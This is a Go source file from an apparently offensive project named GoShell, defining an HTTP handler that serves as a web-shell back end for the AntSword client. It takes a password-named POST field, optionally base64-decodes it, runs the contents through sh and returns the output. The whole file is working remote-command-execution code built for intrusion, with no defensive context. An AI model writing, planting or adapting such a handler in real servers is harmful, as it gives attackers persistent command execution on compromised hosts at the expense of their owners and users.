package handler

import (
	"net/http"

	"github.com/Wd0g/GoShell/lib/common"
)

type Cmd struct {
	Pwd     string // 蚁剑连接密码
	Decoder string // 请求内容解码方式
}

func (c Cmd) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	// 检测参数
	var args string
	switch c.Decoder {
	case "base64":
		args = common.Base64Decode(req.PostFormValue(c.Pwd))
	case "plain":
		args = req.PostFormValue(c.Pwd)
	default:
		args = req.PostFormValue(c.Pwd)
	}

	if args == "" {
		return
	}

	res, _ := common.Shell(args, "sh")
	w.Write([]byte(res))
	return
}
